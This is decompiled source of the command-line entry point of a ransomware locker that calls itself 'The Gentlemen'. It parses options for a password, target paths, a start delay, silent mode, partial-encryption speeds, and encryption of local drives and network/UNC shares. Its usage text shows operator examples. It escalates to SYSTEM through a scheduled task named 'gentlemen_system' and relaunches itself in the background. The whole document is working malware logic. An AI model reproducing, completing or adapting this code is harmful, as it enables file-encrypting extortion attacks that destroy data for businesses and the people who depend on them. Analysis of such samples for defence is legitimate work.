__int64 __fastcall sub_4FAB60(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // r14
  __int128 v4; // xmm15
  __int64 v5; // rdx
  __int64 v6; // rdx
  __int64 v7; // rdx
  __int64 v8; // rdx
  __int64 v9; // rdx
  __int64 v10; // rdx
  __int64 v11; // rdx
  __int64 v12; // rax
  __int64 v13; // rdx
  __int64 v14; // rdi
  __int64 *v15; // r11
  __int64 v16; // rax
  __int64 v17; // rdx
  __int64 v18; // rdi
  __int64 *v19; // r11
  __int64 v20; // rax
  __int64 v21; // rdi
  __int64 *v22; // r11
  _BYTE *v23; // rdx
  _BYTE *v24; // r8
  char **v25; // r9
  _QWORD *v26; // r12
  __int64 v27; // rdx
  _QWORD *v28; // rax
  __int64 v29; // rcx
  __int64 v30; // rdx
  _UNKNOWN **v31; // rsi
  __int64 *v32; // r11
  __int64 v33; // rdx
  _QWORD *v34; // rax
  __int64 v35; // rcx
  __int64 v36; // rdx
  __int64 *v37; // r11
  __int64 v38; // rax
  __int64 v39; // rdx
  char *v40; // rbx
  __int64 v41; // rbx
  __int64 v42; // rax
  _QWORD *v43; // r8
  __int64 v44; // rdx
  unsigned __int64 v45; // rcx
  char *v46; // rsi
  __int64 v47; // rdi
  __int64 v49; // r9
  __int64 v50; // r10
  __int64 v51; // r11
  __int64 v52; // rbx
  __int64 v53; // rax
  __int64 v54; // r12
  _QWORD *v55; // r11
  __int64 v56; // rdi
  __int64 v57; // rdx
  char *v58; // rdi
  __int64 v59; // rbx
  __int64 v60; // rax
  __int64 v61; // r10
  __int64 v62; // r12
  _QWORD *v63; // r11
  __int64 v64; // rdi
  unsigned __int64 v65; // rcx
  unsigned __int64 v66; // rbx
  __int64 v67; // rax
  __int64 v68; // rdx
  __int64 v69; // r8
  _QWORD *v70; // r11
  unsigned __int64 v71; // rdi
  __int64 v72; // rax
  __int64 v73; // rsi
  bool v74; // dl
  __int64 v75; // rbx
  __int64 v76; // rax
  __int64 v77; // r8
  __int64 v78; // rdx
  unsigned __int64 v79; // rcx
  __int64 v80; // rsi
  unsigned __int64 v81; // rdi
  __int64 v82; // rbx
  __int64 v83; // rax
  __int64 v84; // rcx
  __int64 v85; // rdi
  __int64 v86; // r8
  unsigned __int64 v87; // rcx
  _QWORD *v88; // rsi
  __int64 v89; // rdi
  _QWORD *v90; // rax
  char *v91; // rdx
  __int64 v92; // rdx
  _QWORD *v93; // r11
  __int64 v94; // rax
  __int64 v95; // rdx
  unsigned __int64 v96; // rbx
  __int64 v97; // r8
  __int64 v98; // r9
  _QWORD *v99; // r11
  __int64 v100; // r10
  __int64 v101; // rbx
  __int64 v102; // r11
  __int64 v103; // r12
  _QWORD *v104; // r11
  __int64 v105; // rdi
  __int64 v106; // rbx
  __int64 v107; // r11
  __int64 v108; // r12
  _QWORD *v109; // r11
  __int64 v110; // rdi
  __int64 v111; // rbx
  __int64 v112; // r11
  __int64 v113; // r12
  _QWORD *v114; // r11
  __int64 v115; // rdi
  __int64 v116; // rbx
  __int64 v117; // r11
  __int64 v118; // r12
  _QWORD *v119; // r11
  __int64 v120; // rdi
  __int64 v121; // rax
  unsigned __int64 v122; // rcx
  __int64 v123; // rdi
  unsigned __int64 v124; // rbx
  __int64 v125; // rdx
  __int64 v126; // rsi
  _QWORD *v127; // r11
  __int64 v128; // rdx
  __int64 *v129; // r11
  __int64 v130; // rax
  __int64 v131; // rcx
  __int64 *v132; // r11
  __int64 v133; // rax
  char *v134; // rbx
  __int64 v135; // rax
  __int64 v136; // rcx
  __int64 v137; // rdi
  __int64 v138; // rax
  __int64 v139; // rbx
  __int64 v140; // rax
  _QWORD *v141; // rax
  __int64 v142; // rdi
  __int64 v143; // rdx
  __int64 v144; // r9
  _QWORD *v145; // r11
  __int64 v146; // rdx
  __int64 i; // rcx
  _QWORD *v148; // rax
  __int64 v149; // rdi
  char *v150; // rsi
  _QWORD *v151; // r11
  __int64 j; // rcx
  __int64 v153; // rax
  __int64 v154; // rdi
  __int64 v155; // rsi
  _QWORD *v156; // r11
  __int64 v157; // rbx
  __int64 v158; // rax
  unsigned __int64 v159; // rcx
  __int64 v160; // rax
  unsigned __int64 v161; // rdx
  __int64 v162; // rdi
  unsigned __int64 v163; // rbx
  __int64 v164; // rax
  __int64 v165; // rsi
  _QWORD *v166; // rdx
  __int64 v167; // rax
  unsigned __int64 v168; // rcx
  __int64 v169; // rax
  unsigned __int64 v170; // rcx
  __int64 v171; // rax
  __int64 v172; // rdx
  __int64 v173; // rdi
  __int64 v174; // rdi
  unsigned __int64 v175; // rbx
  __int64 v176; // rax
  _QWORD *v177; // rax
  __int64 v178; // rcx
  __int64 v179; // rdx
  _QWORD *v180; // rax
  __int64 v181; // rdi
  _QWORD *v182; // rcx
  _QWORD *v183; // r11
  unsigned __int64 v184; // r8
  __int64 v185; // rbx
  __int64 v186; // rax
  unsigned __int64 v187; // rdx
  unsigned __int64 v188; // rdi
  __int64 v189; // rsi
  unsigned __int64 v190; // rdx
  unsigned __int64 v191; // rcx
  __int64 v192; // rsi
  unsigned __int64 v193; // rbx
  __int64 v194; // rdi
  __int64 *v195; // r11
  _QWORD *v196; // rax
  __int64 v197; // rcx
  __int64 v198; // r8
  __int64 v199; // r9
  char v200; // r10
  char v201; // al
  char v202; // r10
  char v203; // al
  unsigned __int64 v204; // rbx
  __int64 v205; // rax
  unsigned __int64 v206; // rcx
  __int64 v207; // r10
  _QWORD *v208; // r11
  __int64 v209; // r9
  _QWORD *v210; // r10
  unsigned __int64 v211; // r12
  __int64 v212; // rax
  __int64 v213; // r13
  _QWORD *v214; // r11
  __int64 v215; // rdx
  __int64 v216; // rax
  __int64 v217; // rax
  __int64 v218; // rax
  __int64 v219; // rdx
  __int64 v220; // rdx
  __int64 v221; // [rsp+10h] [rbp-470h]
  __int64 v222; // [rsp+18h] [rbp-468h]
  __int64 v223; // [rsp+20h] [rbp-460h]
  char v224; // [rsp+57h] [rbp-429h]
  unsigned __int64 v225; // [rsp+68h] [rbp-418h]
  unsigned __int64 v226; // [rsp+70h] [rbp-410h]
  __int64 v227; // [rsp+80h] [rbp-400h]
  unsigned __int64 v228; // [rsp+88h] [rbp-3F8h]
  unsigned __int64 v229; // [rsp+90h] [rbp-3F0h] BYREF
  char *v230; // [rsp+98h] [rbp-3E8h]
  __int64 v231; // [rsp+A0h] [rbp-3E0h]
  __int64 v232; // [rsp+A8h] [rbp-3D8h]
  __int64 v233; // [rsp+B0h] [rbp-3D0h]
  __int64 v234; // [rsp+B8h] [rbp-3C8h]
  __int64 v235; // [rsp+C0h] [rbp-3C0h]
  unsigned __int64 v236; // [rsp+C8h] [rbp-3B8h]
  __int64 v237; // [rsp+D0h] [rbp-3B0h]
  __int64 v238; // [rsp+D8h] [rbp-3A8h]
  __int64 v239; // [rsp+E0h] [rbp-3A0h]
  char *v240; // [rsp+E8h] [rbp-398h]
  __int64 v241; // [rsp+F0h] [rbp-390h]
  __int64 v242; // [rsp+F8h] [rbp-388h]
  __int64 v243; // [rsp+100h] [rbp-380h]
  unsigned __int64 v244; // [rsp+108h] [rbp-378h]
  unsigned __int64 v245; // [rsp+110h] [rbp-370h]
  unsigned __int64 v246; // [rsp+118h] [rbp-368h]
  unsigned __int64 v247; // [rsp+120h] [rbp-360h]
  char v248; // [rsp+128h] [rbp-358h] BYREF
  __int64 v249; // [rsp+130h] [rbp-350h]
  __int64 v250; // [rsp+138h] [rbp-348h]
  _QWORD *v251; // [rsp+140h] [rbp-340h]
  _BYTE *v252; // [rsp+148h] [rbp-338h]
  _BYTE *v253; // [rsp+150h] [rbp-330h]
  _BYTE *v254; // [rsp+158h] [rbp-328h]
  char *v255; // [rsp+160h] [rbp-320h]
  __int64 *v256; // [rsp+168h] [rbp-318h]
  char **v257; // [rsp+170h] [rbp-310h]
  _QWORD *v258; // [rsp+178h] [rbp-308h]
  char *v259; // [rsp+180h] [rbp-300h]
  _QWORD *v260; // [rsp+188h] [rbp-2F8h]
  __int64 v261; // [rsp+190h] [rbp-2F0h]
  __int64 v262; // [rsp+198h] [rbp-2E8h]
  __int64 v263; // [rsp+1A0h] [rbp-2E0h]
  __int64 v264; // [rsp+1A8h] [rbp-2D8h]
  __int64 v265; // [rsp+1B0h] [rbp-2D0h]
  __int64 v266; // [rsp+1B8h] [rbp-2C8h]
  _QWORD *v267; // [rsp+1C0h] [rbp-2C0h]
  __int64 v268; // [rsp+1C8h] [rbp-2B8h]
  _QWORD *v269; // [rsp+1D0h] [rbp-2B0h]
  __int64 v270; // [rsp+1D8h] [rbp-2A8h]
  __int64 v271; // [rsp+1E0h] [rbp-2A0h]
  __int64 v272; // [rsp+1E8h] [rbp-298h]
  __int64 v273; // [rsp+1F0h] [rbp-290h]
  _QWORD *v274; // [rsp+1F8h] [rbp-288h]
  __int64 v275; // [rsp+200h] [rbp-280h]
  __int64 v276; // [rsp+208h] [rbp-278h]
  __int64 v277; // [rsp+210h] [rbp-270h]
  __int64 v278; // [rsp+218h] [rbp-268h]
  char *v279; // [rsp+220h] [rbp-260h]
  _QWORD *v280; // [rsp+228h] [rbp-258h]
  void *v281; // [rsp+230h] [rbp-250h]
  char **v282; // [rsp+238h] [rbp-248h]
  void *v283; // [rsp+240h] [rbp-240h]
  char **v284; // [rsp+248h] [rbp-238h]
  __int128 v285; // [rsp+250h] [rbp-230h]
  _QWORD v286[2]; // [rsp+260h] [rbp-220h] BYREF
  __int128 v287; // [rsp+270h] [rbp-210h]
  void *v288; // [rsp+280h] [rbp-200h]
  char **v289; // [rsp+288h] [rbp-1F8h]
  __int128 v290; // [rsp+290h] [rbp-1F0h]
  _QWORD v291[2]; // [rsp+2A0h] [rbp-1E0h] BYREF
  _QWORD v292[28]; // [rsp+2B0h] [rbp-1D0h] BYREF
  __int128 v293; // [rsp+390h] [rbp-F0h] BYREF
  void *v294; // [rsp+3A0h] [rbp-E0h]
  char **v295; // [rsp+3A8h] [rbp-D8h]
  void *v296; // [rsp+3B0h] [rbp-D0h]
  char **v297; // [rsp+3B8h] [rbp-C8h]
  void *v298; // [rsp+3C0h] [rbp-C0h]
  char **v299; // [rsp+3C8h] [rbp-B8h]
  void *v300; // [rsp+3D0h] [rbp-B0h]
  char **v301; // [rsp+3D8h] [rbp-A8h]
  __int64 v302; // [rsp+3E0h] [rbp-A0h]
  __int64 v303; // [rsp+3E8h] [rbp-98h]
  _QWORD v304[8]; // [rsp+3F0h] [rbp-90h] BYREF
  __int128 v305; // [rsp+430h] [rbp-50h]
  __int128 v306; // [rsp+440h] [rbp-40h]
  _QWORD v307[2]; // [rsp+450h] [rbp-30h] BYREF
  const char *v308; // [rsp+460h] [rbp-20h]
  __int64 v309; // [rsp+468h] [rbp-18h]
  const char *v310; // [rsp+470h] [rbp-10h]
  __int64 v311; // [rsp+478h] [rbp-8h]

  if ( (unsigned __int64)&v229 <= *(_QWORD *)(v3 + 16) )
    sub_470660();
  v258 = (_QWORD *)flag__ptr_FlagSet_String(a1: 0, a2: 0, a3, a4: 8, a5: "password", a6: 8);
  v257 = (char **)flag__ptr_FlagSet_String(
                    a1: 0,
                    a2: 0,
                    a3: v5,
                    a4: 4,
                    a5: "target path(s), comma-separated (optional)",
                    a6: 42);
  v256 = (__int64 *)sub_4D4B60(a1: 0, a2: "delay in minutes before main action", a3: v6, a4: 1, a5: 35);
  v255 = (char *)sub_4D4AA0(a1: 0, a2: "Silent mode (don't rename files)", a3: v7, a4: 6, a5: 32);
  v254 = (_BYTE *)sub_4D4AA0(a1: 0, a2: "run as SYSTEM", a3: v8, a4: 6, a5: 13);
  v253 = (_BYTE *)sub_4D4AA0(a1: 0, a2: "Encrypt only mapped and UNC network shares", a3: v9, a4: 6, a5: 42);
  v252 = (_BYTE *)sub_4D4AA0(
                    a1: 0,
                    a2: "Encrypt both local (SYSTEM) and all network shares (two phases)",
                    a3: v10,
                    a4: 4,
                    a5: 63);
  v12 = sub_4D4AA0(a1: 0, a2: "Encrypt 0.3%!o(MISSING)nly", a3: v11, a4: 9, a5: 26);
  if ( dword_70D560 != 0 )
  {
    v12 = sub_4725A0(a1: v14);
    *v15 = v12;
    v13 = qword_6C7AE0;
    v15[1] = qword_6C7AE0;
  }
  qword_6C7AE0 = v12;
  v16 = sub_4D4AA0(a1: 0, a2: "Encrypt 1%!o(MISSING)nly", a3: v13, a4: 9, a5: 24);
  if ( dword_70D560 != 0 )
  {
    v16 = sub_4725A0(a1: v18);
    *v19 = v16;
    v17 = qword_6C7AE8;
    v19[1] = qword_6C7AE8;
  }
  qword_6C7AE8 = v16;
  v20 = sub_4D4AA0(a1: 0, a2: "Encrypt 3%!o(MISSING)nly", a3: v17, a4: 4, a5: 24);
  if ( dword_70D560 != 0 )
  {
    v20 = sub_4725A0(a1: v21);
    *v22 = v20;
    v22[1] = qword_6C7AF0;
  }
  qword_6C7AF0 = v20;
  if ( qword_6C7F78 == 0 )
    sub_472A00();
  flag__ptr_FlagSet_Parse();
  v23 = v253;
  if ( *v253 != 0 )
  {
    v24 = v254;
    if ( *v254 != 0 )
    {
      v300 = &unk_50FEE0;
      v301 = &off_569A40;
      fmt_Fprintln();
      os_Exit();
      v23 = v253;
      v24 = v254;
    }
  }
  else
  {
    v24 = v254;
  }
  if ( *v23 != 0 )
  {
    v25 = v257;
    if ( v257[1] != nullptr )
    {
      v298 = &unk_50FEE0;
      v299 = &off_569A50;
      fmt_Fprintln();
      os_Exit();
      v23 = v253;
      v24 = v254;
      v25 = v257;
    }
  }
  else
  {
    v25 = v257;
  }
  if ( *v252 != 0 && (*v23 != 0 || *v24 != 0 || v25[1] != nullptr) )
  {
    v296 = &unk_50FEE0;
    v297 = &off_569A60;
    fmt_Fprintln();
    os_Exit();
  }
  if ( *(_BYTE *)qword_6C7AF0 != 0 && (*(_BYTE *)qword_6C7AE8 != 0 || *(_BYTE *)qword_6C7AE0 != 0)
    || *(_BYTE *)qword_6C7AE8 != 0 && *(_BYTE *)qword_6C7AE0 != 0 )
  {
    v294 = &unk_50FEE0;
    v295 = &off_569A70;
    fmt_Fprintln();
    os_Exit();
  }
  if ( *(_BYTE *)qword_6C7AE0 != 0 )
  {
    qword_658280 = 0x3F689374BC6A7EFALL;
  }
  else if ( *(_BYTE *)qword_6C7AE8 != 0 )
  {
    qword_658280 = 0x3F847AE147AE147BLL;
  }
  else if ( *(_BYTE *)qword_6C7AF0 != 0 )
  {
    qword_658280 = 0x3F9EB851EB851EB8LL;
  }
  else
  {
    qword_658280 = 0x3FB70A3D70A3D70ALL;
  }
  if ( qword_6C7F78 != 1 )
  {
    v26 = v258;
    if ( v258[1] != 0 )
      goto LABEL_43;
    if ( qword_6C7F78 == 0 )
      sub_472940();
  }
  v250 = path_filepath_Base();
  v307[1] = 10;
  v307[0] = "-NoProfile";
  v309 = 8;
  v308 = "-Command";
  v311 = 91;
  v310 = "Write-Host \"♤ The Gentlemen \" -BackgroundColor DarkGray -ForegroundColor White -NoNewline";
  v28 = (_QWORD *)sub_4CDE40(a1: 3, a2: 3, a3: v27, a4: v307);
  v29 = qword_6C7B08;
  v30 = qword_6C7B10;
  v31 = &off_56A8E0;
  v28[12] = &off_56A8E0;
  if ( dword_70D560 != 0 )
  {
    v28 = (_QWORD *)sub_4725E0();
    *v32 = v29;
    v32[1] = v28[13];
    v32[2] = v30;
    v32[3] = v28[15];
  }
  v28[13] = v29;
  v28[14] = v31;
  v28[15] = v30;
  sub_4CF220();
  v307[1] = 10;
  v307[0] = "-NoProfile";
  v309 = 8;
  v308 = "-Command";
  v311 = 78;
  v310 = "Write-Host \" Windows version ♤\" -BackgroundColor Blue -ForegroundColor White";
  v34 = (_QWORD *)sub_4CDE40(a1: 3, a2: 3, a3: v33, a4: v307);
  v35 = qword_6C7B08;
  v36 = qword_6C7B10;
  v34[12] = &off_56A8E0;
  if ( dword_70D560 != 0 )
  {
    v34 = (_QWORD *)sub_4725E0();
    *v37 = v35;
    v37[1] = v34[13];
    v37[2] = v36;
    v37[3] = v34[15];
  }
  v34[13] = v35;
  v34[14] = &off_56A8E0;
  v34[15] = v36;
  sub_4CF220();
  v293 = v4;
  v38 = runtime_convTstring();
  *(_QWORD *)&v293 = &unk_50FEE0;
  *((_QWORD *)&v293 + 1) = v38;
  sub_4BCEA0(
    a1: 1147,
    a2: &v293,
    a3: v39,
    a4: "Usage: %s --password PASS [--path DIR1,DIR2,...] [--T MIN] [--silent] [--full] [--system] [--shares] [--fast] [--sup"
    "erfast] [--ultrafast] \n"
    "\n"
    "\n"
    "  Main Flags \n"
    "  --password PASS    Access password (required)\n"
    "  --path DIRS        Comma-separated list of target directories/disks (optional)\n"
    "  --T MIN            Delay before start, in minutes (optional)\n"
    "  --silent           Silent mode: do NOT rename files after encryption (optional)\n"
    "\n"
    "  Mode Flags (cant be mixed) \n"
    "  --system           Run as SYSTEM: encrypt only local drives (optional)\n"
    "  --shares           Encrypt only mapped network drives and available UNC shares in session context (optional)\n"
    "  --full             Two-phase: --system + --shares. Best practice. (optional)\n"
    "\n"
    "  Speed Flags (cant be mixed) \n"
    "  --fast             9 percent crypt. (optional)\n"
    "  --superfast             3 percent crypt. (optional)\n"
    "  --ultrafast             1 percent crypt. (optional)\n"
    "\n"
    "    Example 1: --password QWERTY --path \"C:\\,D:\\,\\\\nas\\share\" --T 15 --silent\n"
    "    Example 2: --password QWERTY --system --fast\n"
    "    Example 3: --password QWERTY --shares --T 10\n"
    "    Example 4: --password QWERTY --full --ultrafast \n"
    "\n"
    "[+]\n",
    a5: 1,
    a6: 1);
  os_Exit();
  v26 = v258;
LABEL_43:
  if ( qword_6BE1A8 == v26[1] && (v40 = off_6BE1A0, (unsigned __int8)sub_4033C0() != 0) )
  {
    if ( *v252 != 0 )
    {
      v292[24] = &unk_50FEE0;
      v292[25] = &off_569A90;
      v41 = qword_6C7B08;
      fmt_Fprintln();
      v42 = sub_4B4D40();
      if ( qword_6C7F78 == 0 )
        sub_472A00();
      v240 = (char *)v41;
      v272 = v42;
      v43 = (_QWORD *)((((1 - qword_6C7F80) >> 63) & 0x10) + qword_6C7F70);
      v44 = qword_6C7F78 - 1;
      v45 = 0;
      v46 = &v248;
      v47 = 0;
      while ( v44 > 0 )
      {
        v49 = v43[1];
        v50 = *v43;
        if ( v49 == 6 && *(_DWORD *)v50 == 1969630509 && *(_WORD *)(v50 + 4) == 27756 )
        {
          v51 = v47;
        }
        else if ( v49 == 5 && *(_DWORD *)v50 == 1819633197 && *(_BYTE *)(v50 + 4) == 108 )
        {
          v51 = v47;
        }
        else
        {
          v51 = v47 + 1;
          if ( v45 < v47 + 1 )
          {
            v247 = v44;
            v280 = v43;
            v238 = v49;
            v270 = v50;
            v52 = v47 + 1;
            v53 = runtime_growslice(a1: 1, a2: &unk_50FEE0);
            v44 = v247;
            v43 = v280;
            v49 = v238;
            v50 = v270;
            v46 = (char *)v53;
            v51 = v52;
          }
          v54 = 16 * (v51 - 1);
          *(_QWORD *)&v46[v54 + 8] = v49;
          if ( dword_70D560 != 0 )
          {
            sub_4725A0(a1: v51);
            *v55 = v50;
            v55[1] = *(_QWORD *)&v46[v54];
            v51 = v56;
          }
          *(_QWORD *)&v46[v54] = v50;
        }
        v43 += 2;
        --v44;
        v47 = v51;
      }
      v225 = v45;
      v259 = v46;
      v57 = v47 + 1;
      v247 = v47 + 1;
      if ( v45 < v47 + 1 )
      {
        v59 = v47 + 1;
        v60 = runtime_growslice(a1: 1, a2: &unk_50FEE0);
        v58 = v259;
        v46 = (char *)v60;
        v57 = v59;
      }
      else
      {
        v58 = v46;
      }
      v61 = 16 * (v57 - 1);
      *(_QWORD *)&v46[v61 + 8] = 8;
      if ( dword_70D560 != 0 )
      {
        v62 = *(_QWORD *)&v46[v61];
        sub_472580(a1: v58);
        *v63 = v62;
      }
      *(_QWORD *)&v46[v61] = "--system";
      sub_4CDE40(a1: v57, a2: v45, a3: v45, a4: v46);
      sub_4CF280();
      v65 = v225;
      v66 = v247;
      if ( v225 < v247 )
        v67 = runtime_growslice(a1: 1, a2: &unk_50FEE0);
      else
        v67 = (__int64)v259;
      v68 = 16 * (v66 - 1);
      *(_QWORD *)(v67 + v68 + 8) = 8;
      if ( dword_70D560 != 0 )
      {
        v67 = sub_472580(a1: v64);
        *v70 = v69;
      }
      *(_QWORD *)(v67 + v68) = "--shares";
      v71 = v66;
      v40 = v240;
      sub_4CDE40(a1: v71, a2: v65, a3: v68, a4: v67);
      sub_4CF280();
      os_Exit();
    }
    if ( *v254 != 0 )
    {
      v72 = os_user_Current();
      if ( v40 != nullptr )
      {
        v74 = false;
      }
      else
      {
        v262 = v72;
        v74 = (unsigned __int8)strings_EqualFold(a1: 6, a2: v73, a3: *(_QWORD *)(v72 + 32), a4: "SYSTEM") != 0
           || *(_QWORD *)(v262 + 8) == 8 && **(_QWORD **)v262 == 0x38312D352D312D53LL;
      }
      if ( !v74 )
      {
        v292[22] = &unk_50FEE0;
        v292[23] = &off_569AA0;
        v75 = qword_6C7B08;
        fmt_Fprintln();
        v76 = sub_4B4D40();
        if ( qword_6C7F78 == 0 )
          sub_472A00();
        v239 = v75;
        v271 = v76;
        v77 = (((1 - qword_6C7F80) >> 63) & 0x10) + qword_6C7F70;
        v78 = qword_6C7F78 - 1;
        v79 = 0;
        v80 = 0;
        v81 = 0;
        while ( v78 > 0 )
        {
          v209 = *(_QWORD *)(v77 + 8);
          v210 = *(_QWORD **)v77;
          if ( v209 == 8 && *v210 == 0x6D65747379732D2DLL )
          {
            v211 = v81;
          }
          else
          {
            v211 = v81 + 1;
            if ( v79 < v81 + 1 )
            {
              v247 = v78;
              v280 = (_QWORD *)v77;
              v269 = v210;
              v237 = v209;
              v212 = runtime_growslice(a1: 1, a2: &unk_50FEE0);
              v78 = v247;
              v77 = (__int64)v280;
              v209 = v237;
              v210 = v269;
              v80 = v212;
              v75 = v239;
            }
            v213 = 16 * (v211 - 1);
            *(_QWORD *)(v80 + v213 + 8) = v209;
            if ( dword_70D560 != 0 )
            {
              sub_4725A0(a1: v81);
              *v214 = v210;
              v214[1] = *(_QWORD *)(v213 + v80);
            }
            *(_QWORD *)(v80 + v213) = v210;
          }
          v77 += 16;
          --v78;
          v81 = v211;
        }
        v229 = v79;
        v228 = v81;
        v263 = v80;
        sub_495140();
        sub_490100(a1: 60000000000LL);
        v261 = sub_48C180(a1: "15:04", a2: 5);
        v279 = (char *)sub_4C83E0(a1: " ", a2: 1, a3: v215, a4: v229);
        v247 = v228;
        v305 = v4;
        v306 = v4;
        v216 = runtime_convTstring();
        *(_QWORD *)&v305 = &unk_50FEE0;
        *((_QWORD *)&v305 + 1) = v216;
        v217 = runtime_convTstring();
        *(_QWORD *)&v306 = &unk_50FEE0;
        *((_QWORD *)&v306 + 1) = v217;
        fmt_Sprintf();
        v218 = sub_472BEF(a1: v291);
        v292[1] = 7;
        v292[0] = "/Create";
        v292[3] = 3;
        v292[2] = "/RU";
        v292[5] = 6;
        v292[4] = "SYSTEM";
        v292[7] = 3;
        v292[6] = "/SC";
        v292[9] = 4;
        v292[8] = "ONCE";
        v292[11] = 3;
        v292[10] = "/TN";
        v292[13] = 16;
        v292[12] = "gentlemen_system";
        v292[15] = 3;
        v292[14] = "/TR";
        v292[17] = 7;
        v292[16] = v218;
        v292[19] = 3;
        v292[18] = "/ST";
        v292[21] = v75;
        v292[20] = v261;
        v304[1] = 7;
        v304[0] = "/Delete";
        v304[3] = 3;
        v304[2] = "/TN";
        v304[5] = 16;
        v304[4] = "gentlemen_system";
        v304[7] = 2;
        v304[6] = "/F";
        sub_4CDE40(a1: 4, a2: 4, a3: "gentlemen_system", a4: v304);
        sub_4CF220();
        sub_4CDE40(a1: 11, a2: 11, a3: v219, a4: v292);
        sub_4CF220();
        v307[1] = 4;
        v307[0] = "/Run";
        v309 = 3;
        v308 = "/TN";
        v311 = 16;
        v310 = "gentlemen_system";
        sub_4CDE40(a1: 3, a2: 3, a3: v220, a4: v307);
        sub_4CF220();
        os_Exit();
      }
    }
    sub_4B3280();
    v291[0] = &unk_50FEE0;
    v291[1] = &off_569AB0;
    v82 = qword_6C7B08;
    fmt_Fprintln();
    v83 = sub_4B4D40();
    if ( v84 != 0 )
    {
      v290 = v4;
      v288 = &unk_50FEE0;
      v289 = &off_569AC0;
      *(_QWORD *)&v290 = *(_QWORD *)(v84 + 8);
      *((_QWORD *)&v290 + 1) = v85;
      return fmt_Fprintln();
    }
    else
    {
      v232 = v82;
      v265 = v83;
      v287 = v4;
      v286[1] = 10;
      v286[0] = "--password";
      v86 = *v258;
      *((_QWORD *)&v287 + 1) = v258[1];
      *(_QWORD *)&v287 = v86;
      if ( v257[1] != nullptr )
      {
        v247 = (unsigned __int64)v257[1];
        v279 = *v257;
        v90 = (_QWORD *)runtime_growslice(a1: 2, a2: &unk_50FEE0);
        v90[5] = 6;
        if ( dword_70D560 != 0 )
        {
          v90 = (_QWORD *)sub_4725C0();
          *v93 = v92;
          v91 = v279;
          v93[1] = v279;
          v93[2] = v90[6];
        }
        else
        {
          v91 = v279;
        }
        v90[4] = "--path";
        v90[7] = v247;
        v90[6] = v91;
        v82 = v232;
        v88 = v90;
        v89 = 4;
      }
      else
      {
        v87 = 2;
        v88 = v286;
        v89 = 2;
      }
      if ( *v256 > 0 )
      {
        v226 = v87;
        v260 = v88;
        v247 = v89 + 2;
        v94 = sub_49CDE0();
        v87 = v226;
        v95 = v247;
        if ( v226 < v247 )
        {
          v249 = v94;
          v96 = v247;
          v88 = (_QWORD *)runtime_growslice(a1: 2, a2: &unk_50FEE0);
          v95 = v96;
          v94 = v249;
        }
        else
        {
          v88 = v260;
        }
        v97 = 2 * (v95 - 2);
        v88[v97 + 1] = 3;
        if ( dword_70D560 != 0 )
        {
          v94 = sub_4725C0();
          *v99 = v98;
          v99[1] = v94;
          v99[2] = v88[v97 + 2];
        }
        v88[v97] = "--T";
        v88[v97 + 3] = 10;
        v88[v97 + 2] = v94;
        v82 = v232;
        v89 = v95;
      }
      if ( *v255 != 0 )
      {
        v100 = v89 + 1;
        if ( v87 < v89 + 1 )
        {
          v101 = v89 + 1;
          v88 = (_QWORD *)runtime_growslice(a1: 1, a2: &unk_50FEE0);
          v100 = v101;
          v82 = v232;
        }
        v102 = 16 * (v100 - 1);
        *(_QWORD *)((char *)v88 + v102 + 8) = 8;
        if ( dword_70D560 != 0 )
        {
          v103 = *(_QWORD *)((char *)v88 + v102);
          sub_472580(a1: 16 * (v100 - 1));
          *v104 = v103;
          v102 = v105;
        }
        *(_QWORD *)((char *)v88 + v102) = "--silent";
      }
      else
      {
        v100 = v89;
      }
      if ( *(_BYTE *)qword_6C7AE0 != 0 )
      {
        if ( v87 < ++v100 )
        {
          v106 = v100;
          v88 = (_QWORD *)runtime_growslice(a1: 1, a2: &unk_50FEE0);
          v100 = v106;
          v82 = v232;
        }
        v107 = 16 * (v100 - 1);
        *(_QWORD *)((char *)v88 + v107 + 8) = 11;
        if ( dword_70D560 != 0 )
        {
          v108 = *(_QWORD *)((char *)v88 + v107);
          sub_472580(a1: 16 * (v100 - 1));
          *v109 = v108;
          v107 = v110;
        }
        *(_QWORD *)((char *)v88 + v107) = "--ultrafast";
      }
      if ( *(_BYTE *)qword_6C7AE8 != 0 )
      {
        if ( v87 < ++v100 )
        {
          v111 = v100;
          v88 = (_QWORD *)runtime_growslice(a1: 1, a2: &unk_50FEE0);
          v100 = v111;
          v82 = v232;
        }
        v112 = 16 * (v100 - 1);
        *(_QWORD *)((char *)v88 + v112 + 8) = 11;
        if ( dword_70D560 != 0 )
        {
          v113 = *(_QWORD *)((char *)v88 + v112);
          sub_472580(a1: 16 * (v100 - 1));
          *v114 = v113;
          v112 = v115;
        }
        *(_QWORD *)((char *)v88 + v112) = "--superfast";
      }
      if ( *(_BYTE *)qword_6C7AF0 != 0 )
      {
        if ( v87 < ++v100 )
        {
          v116 = v100;
          v88 = (_QWORD *)runtime_growslice(a1: 1, a2: &unk_50FEE0);
          v100 = v116;
          v82 = v232;
        }
        v117 = 16 * (v100 - 1);
        *(_QWORD *)((char *)v88 + v117 + 8) = 6;
        if ( dword_70D560 != 0 )
        {
          v118 = *(_QWORD *)((char *)v88 + v117);
          sub_472580(a1: 16 * (v100 - 1));
          *v119 = v118;
          v117 = v120;
        }
        *(_QWORD *)((char *)v88 + v117) = "--fast";
      }
      v268 = sub_4CDE40(a1: v100, a2: v87, a3: v87, a4: v88);
      v121 = sub_481E00();
      v124 = v82 + 1;
      if ( v122 < v124 )
        v121 = runtime_growslice(a1: 1, a2: &unk_50FEE0);
      v125 = 16 * (v124 - 1);
      *(_QWORD *)(v121 + v125 + 8) = 19;
      if ( dword_70D560 != 0 )
      {
        v121 = sub_472580(a1: v123);
        *v127 = v126;
      }
      *(_QWORD *)(v121 + v125) = "LOCKER_BACKGROUND=1";
      v128 = v268;
      *(_QWORD *)(v268 + 48) = v124;
      *(_QWORD *)(v128 + 56) = v122;
      if ( dword_70D560 != 0 )
      {
        v121 = sub_4725A0(a1: v123);
        *v129 = v121;
        v129[1] = *(_QWORD *)(v128 + 40);
      }
      *(_QWORD *)(v128 + 40) = v121;
      v130 = runtime_newobject();
      *(_DWORD *)(v130 + 24) = 0x8000000;
      if ( dword_70D560 != 0 )
      {
        v130 = sub_472600();
        *v132 = v130;
        v131 = v268;
        v132[1] = *(_QWORD *)(v268 + 152);
        v132[2] = *(_QWORD *)(v131 + 88);
        v132[3] = *(_QWORD *)(v131 + 104);
        v132[4] = *(_QWORD *)(v131 + 120);
      }
      else
      {
        v131 = v268;
      }
      *(_QWORD *)(v131 + 152) = v130;
      *(_OWORD *)(v131 + 80) = v4;
      *(_OWORD *)(v131 + 96) = v4;
      *(_OWORD *)(v131 + 112) = v4;
